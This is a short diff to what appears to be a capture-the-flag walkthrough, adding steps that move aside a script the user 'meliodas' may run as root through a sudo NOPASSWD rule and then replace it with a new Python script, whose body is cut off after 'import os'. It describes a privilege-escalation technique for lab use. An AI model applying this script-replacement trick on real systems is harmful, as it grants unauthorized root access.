@@ -11,9 +11,16 @@ User meliodas may run the following commands on ubuntu:
     (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
 ```
 
+Remove the script. (or delete it)
+
+```
+mv bak.py /tmp
+```
+
 Replace it with this one.
 
 ```
+nano bak.py
 #/usr/bin/python
 
 import os
